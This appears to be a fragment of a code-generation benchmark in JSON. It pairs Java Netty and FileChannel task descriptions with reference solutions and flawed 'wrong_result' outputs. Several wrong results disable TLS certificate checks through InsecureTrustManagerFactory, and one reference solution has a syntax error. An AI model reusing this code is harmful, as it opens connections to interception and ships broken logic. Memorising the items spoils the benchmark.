    "wrong_result": "public class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() throws IOException {\n        if (mappedBuffer != null) {\n            mappedBuffer.force();\n        }\n    }\n}"
  },
  {
    "Task_id": 137,
    "Instruction": "Task Description: Implement a TCP client using Java Netty framework that can maintain persistent connections to multiple hosts and send messages to them.\n\nClass Description: This class provides functionality to initialize and manage Netty TCP client connections to multiple hosts. It maintains a connection pool using maps to store active channels and their associated event loop groups.\n\nAttributes:\n- channelMap: Map<String, Channel> - Stores active channels mapped by host address\n- groupMap: Map<String, NioEventLoopGroup> - Stores event loop groups mapped by host address\n\nMethods:\n- initSocketClientAndSendMessage(String host, String message) -> Channel - Initializes a new TCP client connection to the specified host if one doesn't exist, or reuses an existing connection. Sends the provided message to the host. Returns the Channel object for the connection.\n  - Input Parameters:\n    - host: String - The host address to connect to\n    - message: String - The message to be sent to the host\n  - Return Type: Channel - The Netty Channel object representing the connection",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.bytes.ByteArrayEncoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport java.net.InetSocketAddress;\nimport java.nio.charset.Charset;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic static Map<String, Channel> channelMap;\npublic static Map<String, NioEventLoopGroup> groupMap;\n\n@Override\npublic Channel initSocketClientAndSendMessage(String host, String message) throws Exception {\n    if(channelMap==null){\n        channelMap = new HashMap<>();\n    }\n    if(groupMap==null){\n        groupMap = new HashMap<>();\n    }\n\n    if(channelMap.get(host)==null){\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, 9003))\n                .handler(new ChannelInitializer() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        ch.pipeline().addLast(new StringEncoder(Charset.forName(\"GBK\")));\n                        ch.pipeline().addLast(new ByteArrayEncoder());\n                        ch.pipeline().addLast(new ChunkedWriteHandler());\n                    }\n                });\n            ChannelFuture cf = b.connect();\n            channelMap.put(host, cf.channel());\n            groupMap.put(host, group);\n            return null;\n        } catch (Exception e){\n            group.shutdownGracefully().sync();\n            return null;\n        }\n    }else{\n        channelMap.get(host).writeAndFlush(StringTools.hexStringToBytes(message));\n        return channelMap.get(host);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class NettyTcpClient {\n    private final Map<String, Channel> channelMap = new ConcurrentHashMap<>();\n    private final Map<String, NioEventLoopGroup> groupMap = new ConcurrentHashMap<>();\n\n    public Channel initSocketClientAndSendMessage(String host, String message) {\n        if (channelMap.containsKey(host)) {\n            Channel channel = channelMap.get(host);\n            if (channel.isActive()) {\n                channel.writeAndFlush(Unpooled.copiedBuffer(message.getBytes()));\n                return channel;\n            } else {\n                channelMap.remove(host);\n                groupMap.remove(host);\n            }\n        }\n\n        NioEventLoopGroup group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new StringEncoder(), new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelActive(ChannelHandlerContext ctx) {\n                                ctx.writeAndFlush(Unpooled.copiedBuffer(message.getBytes()));\n                            }\n                        });\n                    }\n                });\n\n        try {\n            Channel channel = bootstrap.connect(host, 8080).sync().channel();\n            channelMap.put(host, channel);\n            groupMap.put(host, group);\n            return channel;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Failed to connect to \" + host, e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 141,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, maintenance, and graceful shutdown.\n\nClass Description: HttpEventChannelManager is a Netty-based TCP client manager that creates and maintains connections to remote servers, provides connection metrics, and handles resource cleanup.\n\nAttributes:\n- LOG: [Logger] - Logger instance for logging debug and error messages\n- connectionSuccess: [Counter] - Metric counter for successful connections\n- connectionFailure: [Counter] - Metric counter for failed connections\n- liveConnections: [AtomicDouble] - Gauge metric for current active connections\n- nettyChannelBufferSize: [AtomicDouble] - Gauge metric for current channel buffer size\n- lowWriteBufferWatermark: [int] - Low watermark for write buffer\n- highWriteBufferWatermark: [int] - High watermark for write buffer\n- eventLoopGroup: [EventLoopGroup] - Netty event loop group for I/O operations\n- encoderEventLoopGroup: [EventLoopGroup] - Optional event loop group for compression\n- bootstrap: [Bootstrap] - Netty bootstrap for client configuration\n- channels: [ConcurrentMap<String, Channel>] - Map of active channels keyed by host:port\n\nMethods:\n- HttpEventChannelManager([Registry, MrePublishConfiguration]) -> [void] - Constructor that initializes metrics, event loops, and bootstrap configuration\n- findOrCreate([InetSocketAddress]) -> [Channel] - Finds existing or creates new channel for given address\n- find([InetSocketAddress]) -> [Channel] - Finds existing channel for given address\n- close([InetSocketAddress]) -> [void] - Closes channel for given address\n- getHostPortString([InetSocketAddress]) -> [String] - Helper method to format address as host:port string",
    "Canonical_solution": "import com.netflix.spectator.api.Counter;\nimport com.netflix.spectator.api.Registry;\nimport com.netflix.spectator.impl.AtomicDouble;\nimport io.mantisrx.publish.config.MrePublishConfiguration;\nimport io.mantisrx.publish.internal.metrics.SpectatorUtils;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.DefaultEventLoopGroup;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.WriteBufferWaterMark;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class HttpEventChannelManager {\n\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannel.class);\n\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final AtomicDouble liveConnections;\n    private final AtomicDouble nettyChannelBufferSize;\n\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(\n            Registry registry,\n            MrePublishConfiguration config) {\n\n        this.connectionSuccess =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionSuccess\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.connectionFailure =\n                SpectatorUtils.buildAndRegisterCounter(\n                        registry, \"connectionFailure\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.liveConnections =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"liveConnections\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n        this.nettyChannelBufferSize =\n                SpectatorUtils.buildAndRegisterGauge(\n                        registry, \"bufferSize\", \"channel\", HttpEventChannel.CHANNEL_TYPE);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup(config.getIoThreads());\n\n        boolean gzipEnabled = config.getGzipEnabled();\n        if (gzipEnabled) {\n            this.encoderEventLoopGroup = new DefaultEventLoopGroup(config.getCompressionThreads());\n        } else {\n            this.encoderEventLoopGroup = null;\n        }\n\n        this.bootstrap = new Bootstrap()\n                .group(this.eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.MESSAGE_SIZE_ESTIMATOR, MantisMessageSizeEstimator.DEFAULT)\n                .option(ChannelOption.WRITE_BUFFER_WATER_MARK,\n                        new WriteBufferWaterMark(\n                                lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new HttpEventChannelInitializer(\n                        registry, config, encoderEventLoopGroup));\n        this.channels = new ConcurrentHashMap<>();\n\n        Runtime.getRuntime().addShutdownHook(new Thread(this.eventLoopGroup::shutdownGracefully));\n    }\n\n    Channel findOrCreate(InetSocketAddress address) {\n        Channel channel = find(address);\n\n        if (channel == null) {\n            LOG.debug(\"creating new channel for {}\", address);\n            ChannelFuture channelFuture = bootstrap.connect(address);\n            channel = channelFuture.channel();\n\n            channels.put(getHostPortString(address), channel);\n\n            channel.closeFuture().addListener(future -> {\n                LOG.debug(\"closing channel for {}\", address);\n                channels.remove(getHostPortString(address));\n                liveConnections.set((double) channels.size());\n            });\n\n            channelFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    LOG.debug(\"connection success for {}\", address);\n                    connectionSuccess.increment();\n                    liveConnections.set((double) channels.size());\n                } else {\n                    LOG.debug(\"failed to connect to {}\", address);\n                    connectionFailure.increment();\n                }\n            });\n        }\n\n        nettyChannelBufferSize.set(highWriteBufferWatermark - channel.bytesBeforeUnwritable());\n\n        return channel;\n    }\n\n    private Channel find(InetSocketAddress address) {\n        return channels.get(getHostPortString(address));\n    }\n\n    void close(InetSocketAddress address) {\n        Channel channel = find(address);\n        if (channel != null) {\n            channel.close();\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getHostString() + ':' + address.getPort();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.util.AttributeKey;\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.Counter;\nimport io.prometheus.client.Gauge;\nimport io.prometheus.client.Histogram;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\nimport java.util.concurrent.atomic.AtomicDouble;\n\npublic class HttpEventChannelManager {\n    private static final Logger LOG = LoggerFactory.getLogger(HttpEventChannelManager.class);\n    private final Counter connectionSuccess;\n    private final Counter connectionFailure;\n    private final Gauge liveConnections;\n    private final Gauge nettyChannelBufferSize;\n    private final int lowWriteBufferWatermark;\n    private final int highWriteBufferWatermark;\n    private final EventLoopGroup eventLoopGroup;\n    private final EventLoopGroup encoderEventLoopGroup;\n    private final Bootstrap bootstrap;\n    private final ConcurrentMap<String, Channel> channels;\n\n    public HttpEventChannelManager(CollectorRegistry registry, MrePublishConfiguration config) {\n        this.connectionSuccess = Counter.build().name(\"http_event_channel_connections_total\").labelNames(\"status\", \"host\", \"port\").help(\"Total number of HTTP event channel connections.\").register(registry);\n        this.connectionFailure = Counter.build().name(\"http_event_channel_connection_failures_total\").labelNames(\"reason\", \"host\", \"port\").help(\"Total number of HTTP event channel connection failures.\").register(registry);\n        this.liveConnections = Gauge.build().name(\"http_event_channel_live_connections\").labelNames(\"host\", \"port\").help(\"Current number of live HTTP event channels.\").register(registry);\n        this.nettyChannelBufferSize = Gauge.build().name(\"http_event_channel_buffer_size\").labelNames(\"host\", \"port\").help(\"Current buffer size of HTTP event channels.\").register(registry);\n\n        this.lowWriteBufferWatermark = config.getLowWriteBufferWatermark();\n        this.highWriteBufferWatermark = config.getHighWriteBufferWatermark();\n\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.encoderEventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        this.channels = new ConcurrentHashMap<>();\n\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.WRITE_BUFFER_WATERMARK, new WriteBufferWaterMark(lowWriteBufferWatermark, highWriteBufferWatermark))\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        try {\n                            SslContext sslCtx = SslContextBuilder.forClient()\n                                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                                    .build();\n                            pipeline.addLast(sslCtx.newHandler(ch.alloc(), \"example.com\", 443));\n                        } catch (Exception e) {\n                            LOG.error(\"Failed to add SSL handler\", e);\n                        }\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(1048576));\n                        pipeline.addLast(new ChannelInboundHandlerAdapter() {\n                            @Override\n                            public void channelActive(ChannelHandlerContext ctx) {\n                                LOG.debug(\"Channel active: {}\", ctx.channel().remoteAddress());\n                            }\n\n                            @Override\n                            public void channelInactive(ChannelHandlerContext ctx) {\n                                LOG.debug(\"Channel inactive: {}\", ctx.channel().remoteAddress());\n                                String hostPort = getHostPortString((InetSocketAddress) ctx.channel().remoteAddress());\n                                liveConnections.labels(hostPort.split(\":\")[0], hostPort.split(\":\")[1]).set(0);\n                                nettyChannelBufferSize.labels(hostPort.split(\":\")[0], hostPort.split(\":\")[1]).set(0);\n                                channels.remove(hostPort);\n                            }\n\n                            @Override\n                            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                LOG.error(\"Channel exception: {}\", ctx.channel().remoteAddress(), cause);\n                                ctx.close();\n                            }\n                        });\n                    }\n                });\n    }\n\n    public Channel findOrCreate(InetSocketAddress address) {\n        String hostPort = getHostPortString(address);\n        Channel channel = channels.get(hostPort);\n        if (channel != null && channel.isActive()) {\n            return channel;\n        }\n\n        try {\n            channel = bootstrap.connect(address).sync().channel();\n            channels.put(hostPort, channel);\n            liveConnections.labels(address.getHostString(), String.valueOf(address.getPort())).inc();\n            nettyChannelBufferSize.labels(address.getHostString(), String.valueOf(address.getPort())).set(channel.bytesBeforeUnwritable());\n            LOG.info(\"Created new channel for {}\", hostPort);\n            connectionSuccess.labels(\"success\", address.getHostString(), String.valueOf(address.getPort())).inc();\n            return channel;\n        } catch (Exception e) {\n            LOG.error(\"Failed to create channel for {}\", hostPort, e);\n            connectionFailure.labels(\"connect_failed\", address.getHostString(), String.valueOf(address.getPort())).inc();\n            return null;\n        }\n    }\n\n    public Channel find(InetSocketAddress address) {\n        String hostPort = getHostPortString(address);\n        return channels.get(hostPort);\n    }\n\n    public void close(InetSocketAddress address) {\n        String hostPort = getHostPortString(address);\n        Channel channel = channels.remove(hostPort);\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n            liveConnections.labels(address.getHostString(), String.valueOf(address.getPort())).set(0);\n            nettyChannelBufferSize.labels(address.getHostString(), String.valueOf(address.getPort())).set(0);\n            LOG.info(\"Closed channel for {}\", hostPort);\n        }\n    }\n\n    private String getHostPortString(InetSocketAddress address) {\n        return address.getAddress().getHostAddress() + \":\" + address.getPort();\n    }\n}\n```"
  },
  {
    "Task_id": 143,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client for HTTP communication, supporting SSL/TLS encryption, chunked content transfer, and asynchronous request/response handling.\n\nClass Description: The NettyClient class establishes and manages TCP connections to a remote server using Netty's asynchronous I/O framework. It handles HTTP requests and responses, supports SSL/TLS encryption, and provides callback mechanisms for asynchronous processing.\n\nAttributes:\n- hostname: String - The target server hostname\n- port: int - The target server port\n- group: EventLoopGroup - Manages client-side I/O threads\n- b: Bootstrap - Configures Netty client behavior\n- responseParts: Queue<HttpObject> - Stores received HTTP response parts\n- callbackInvoked: AtomicBoolean - Tracks callback invocation status\n- communicationHandler: CommunicationHandler - Processes incoming HTTP messages\n- isOpen: AtomicBoolean - Tracks client connection state\n- request: HttpRequest - Current HTTP request being sent\n- content: ChunkedInput<HttpContent> - Optional request content\n- responseFuture: FutureResult<ResponseParts> - Future for response handling\n- callback: Callback<ResponseParts> - Callback for response handling\n- channelConnectFuture: ChannelFuture - Future for channel connection\n- exception: Exception - Stores any encountered exceptions\n- isKeepAlive: boolean - Tracks HTTP keep-alive status\n\nMethods:\n- NettyClient(String, int, SSLFactory) -> void - Constructor that initializes the client with hostname, port, and optional SSL factory\n- sendRequest(HttpRequest, ChunkedInput<HttpContent>, Callback<ResponseParts>) -> Future<ResponseParts> - Sends an HTTP request with optional content and registers a callback\n- close() -> void - Gracefully shuts down the client and releases resources\n- resetState() -> void - Resets internal state for new requests\n- createChannel() -> void - Creates a new channel connection to the server\n- invokeFutureAndCallback(String) -> void - Invokes the response future and callback with results\n- CommunicationHandler (inner class) - Handles incoming HTTP messages and exceptions\n\nInner Classes:\n- CommunicationHandler: SimpleChannelInboundHandler<HttpObject> - Processes HTTP responses and exceptions\n- ResponseParts: static class - Wrapper for HTTP response parts and completion context",
    "Canonical_solution": "import com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.commons.Callback;\nimport com.github.ambry.router.FutureResult;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpObject;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpResponse;\nimport io.netty.handler.codec.http.HttpUtil;\nimport io.netty.handler.codec.http.LastHttpContent;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.util.ReferenceCountUtil;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.io.Closeable;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyClient implements Closeable {\n  private final String hostname;\n  private final int port;\n  private final EventLoopGroup group = new NioEventLoopGroup();\n  private final Bootstrap b = new Bootstrap();\n  private final Queue<HttpObject> responseParts = new LinkedList<HttpObject>();\n  private final AtomicBoolean callbackInvoked = new AtomicBoolean(false);\n  private final CommunicationHandler communicationHandler = new CommunicationHandler();\n  private final AtomicBoolean isOpen = new AtomicBoolean(true);\n\n  private HttpRequest request;\n  private ChunkedInput<HttpContent> content;\n  private FutureResult<ResponseParts> responseFuture;\n  private Callback<ResponseParts> callback;\n  private volatile ChannelFuture channelConnectFuture;\n  private volatile Exception exception = null;\n  private volatile boolean isKeepAlive = false;\n\n  public NettyClient(final String hostname, final int port, final SSLFactory sslFactory) throws InterruptedException {\n    this.hostname = hostname;\n    this.port = port;\n    b.group(group).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n      @Override\n      public void initChannel(SocketChannel ch) throws Exception {\n        ChannelPipeline pipeline = ch.pipeline();\n        if (sslFactory != null) {\n          pipeline.addLast(\"sslHandler\",\n              new SslHandler(sslFactory.createSSLEngine(hostname, port, SSLFactory.Mode.CLIENT)));\n        }\n        pipeline.addLast(new HttpClientCodec()).addLast(new ChunkedWriteHandler()).addLast(communicationHandler);\n      }\n    });\n    createChannel();\n  }\n\n  public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content,\n      Callback<ResponseParts> callback) {\n    this.request = request;\n    this.content = content;\n    this.callback = callback;\n    resetState();\n    channelConnectFuture.addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) {\n        if (future.isSuccess()) {\n          future.channel().write(request).addListener(new GenericFutureListener<ChannelFuture>() {\n            @Override\n            public void operationComplete(ChannelFuture future) {\n              if (!future.isSuccess()) {\n                exception = (Exception) future.cause();\n                invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n              }\n            }\n          });\n          if (content != null) {\n            future.channel().write(content).addListener(new GenericFutureListener<ChannelFuture>() {\n              @Override\n              public void operationComplete(ChannelFuture future) {\n                if (!future.isSuccess()) {\n                  exception = (Exception) future.cause();\n                  invokeFutureAndCallback(\"WriteResultListener::operationComplete\");\n                }\n              }\n            });\n          }\n          future.channel().flush();\n        } else {\n          exception = (Exception) future.cause();\n          invokeFutureAndCallback(\"RequestSender::operationComplete\");\n        }\n      }\n    });\n    return responseFuture;\n  }\n\n  @Override\n  public void close() {\n    if (isOpen.compareAndSet(true, false) {\n      group.shutdownGracefully();\n    }\n  }\n\n  private void resetState() {\n    responseFuture = new FutureResult<>();\n    responseParts.clear();\n    exception = null;\n    callbackInvoked.set(false);\n  }\n\n  private void createChannel() throws InterruptedException {\n    channelConnectFuture = b.connect(hostname, port);\n    channelConnectFuture.channel().closeFuture().addListener(new GenericFutureListener<ChannelFuture>() {\n      @Override\n      public void operationComplete(ChannelFuture future) throws InterruptedException {\n        if (isOpen.get()) {\n          createChannel();\n        }\n        invokeFutureAndCallback(\"ChannelCloseListener::operationComplete\");\n      }\n    });\n  }\n\n  private void invokeFutureAndCallback(String completionContext) {\n    if (callbackInvoked.compareAndSet(false, true)) {\n      responseFuture.done(new ResponseParts(responseParts, completionContext), exception);\n      if (callback != null) {\n        callback.onCompletion(new ResponseParts(responseParts, completionContext), exception);\n      }\n    }\n  }\n\n  @ChannelHandler.Sharable\n  private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n    @Override\n    public void channelRead0(ChannelHandlerContext ctx, HttpObject in) {\n      responseParts.offer(ReferenceCountUtil.retain(in));\n      if (in instanceof HttpResponse && in.decoderResult().isSuccess()) {\n        isKeepAlive = HttpUtil.isKeepAlive((HttpResponse) in);\n      } else if (in.decoderResult().isFailure()) {\n        Throwable cause = in.decoderResult().cause();\n        if (cause instanceof Exception) {\n          exception = (Exception) cause;\n        } else {\n          exception =\n              new Exception(\"Encountered Throwable when trying to decode response. Message: \" + cause.getMessage());\n        }\n        invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - decoder failure\");\n      }\n      if (in instanceof LastHttpContent) {\n        if (isKeepAlive) {\n          invokeFutureAndCallback(\"CommunicationHandler::channelRead0 - last content\");\n        } else {\n          ctx.close();\n        }\n      }\n    }\n\n    @Override\n    public void channelInactive(ChannelHandlerContext ctx) {\n      ctx.close();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n      if (cause instanceof Exception) {\n        exception = (Exception) cause;\n        ctx.close();\n      } else {\n        ctx.fireExceptionCaught(cause);\n      }\n    }\n  }\n\n  public static class ResponseParts {\n    public final Queue<HttpObject> queue;\n    public final String completionContext;\n\n    private ResponseParts(Queue<HttpObject> queue, String completionContext) {\n      this.queue = queue;\n      this.completionContext = completionContext;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.stream.ChunkedInput;\nimport io.netty.util.AttributeKey;\n\nimport java.net.URI;\nimport java.util.Queue;\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class NettyClient {\n    private final String hostname;\n    private final int port;\n    private final EventLoopGroup group;\n    private final Bootstrap b;\n    private final Queue<HttpObject> responseParts;\n    private final AtomicBoolean callbackInvoked;\n    private CommunicationHandler communicationHandler;\n    private final AtomicBoolean isOpen;\n    private HttpRequest request;\n    private ChunkedInput<HttpContent> content;\n    private FutureResult<ResponseParts> responseFuture;\n    private Callback<ResponseParts> callback;\n    private ChannelFuture channelConnectFuture;\n    private Exception exception;\n    private boolean isKeepAlive;\n\n    public NettyClient(String hostname, int port, SSLFactory sslFactory) {\n        this.hostname = hostname;\n        this.port = port;\n        this.group = new NioEventLoopGroup();\n        this.b = new Bootstrap();\n        this.responseParts = new ConcurrentLinkedQueue<>();\n        this.callbackInvoked = new AtomicBoolean(false);\n        this.isOpen = new AtomicBoolean(false);\n        this.responseFuture = new FutureResult<>();\n        this.isKeepAlive = false;\n\n        if (sslFactory != null) {\n            try {\n                SslContext sslCtx = SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                b.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), hostname, port));\n                        ch.pipeline().addLast(new HttpClientCodec());\n                        ch.pipeline().addLast(new HttpObjectAggregator(Integer.MAX_VALUE));\n                        ch.pipeline().addLast(new CommunicationHandler());\n                    }\n                });\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to initialize SSL context\", e);\n            }\n        } else {\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new HttpClientCodec());\n                    ch.pipeline().addLast(new HttpObjectAggregator(Integer.MAX_VALUE));\n                    ch.pipeline().addLast(new CommunicationHandler());\n                }\n            });\n        }\n\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public Future<ResponseParts> sendRequest(HttpRequest request, ChunkedInput<HttpContent> content, Callback<ResponseParts> callback) {\n        this.request = request;\n        this.content = content;\n        this.callback = callback;\n        resetState();\n        createChannel();\n        return responseFuture;\n    }\n\n    public void close() {\n        if (isOpen.get()) {\n            group.shutdownGracefully();\n            isOpen.set(false);\n        }\n    }\n\n    private void resetState() {\n        responseParts.clear();\n        callbackInvoked.set(false);\n        isKeepAlive = false;\n        exception = null;\n    }\n\n    private void createChannel() {\n        channelConnectFuture = b.connect(hostname, port);\n        channelConnectFuture.addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                isOpen.set(true);\n                communicationHandler = new CommunicationHandler();\n                Channel channel = future.channel();\n                channel.attr(AttributeKey.newInstance(\"handler\")).set(communicationHandler);\n                if (content != null) {\n                    channel.writeAndFlush(content);\n                } else {\n                    channel.writeAndFlush(request);\n                }\n            } else {\n                exception = future.cause();\n                invokeFutureAndCallback(\"Connection failed\");\n            }\n        });\n    }\n\n    private void invokeFutureAndCallback(String message) {\n        if (!callbackInvoked.get()) {\n            callbackInvoked.set(true);\n            responseFuture.setResult(new ResponseParts(responseParts, isKeepAlive, exception, message));\n            callback.onSuccess(responseFuture.getResult());\n        }\n    }\n\n    private class CommunicationHandler extends SimpleChannelInboundHandler<HttpObject> {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.fireChannelActive();\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n            if (msg instanceof HttpResponse) {\n                HttpResponse response = (HttpResponse) msg;\n                isKeepAlive = HttpHeaders.isKeepAlive(response);\n                responseParts.add(response);\n            } else if (msg instanceof HttpContent) {\n                HttpContent content = (HttpContent) msg;\n                responseParts.add(content);\n                if (content instanceof LastHttpContent) {\n                    invokeFutureAndCallback(\"Request completed\");\n                }\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            exception = cause;\n            invokeFutureAndCallback(\"Exception caught\");\n            ctx.close();\n        }\n    }\n\n    public static class ResponseParts {\n        private final Queue<HttpObject> parts;\n        private final boolean isKeepAlive;\n        private final Exception exception;\n        private final String message;\n\n        public ResponseParts(Queue<HttpObject> parts, boolean isKeepAlive, Exception exception, String message) {\n            this.parts = parts;\n            this.isKeepAlive = isKeepAlive;\n            this.exception = exception;\n            this.message = message;\n        }\n\n        public Queue<HttpObject> getParts() {\n            return parts;\n        }\n\n        public boolean isKeepAlive() {\n            return isKeepAlive;\n        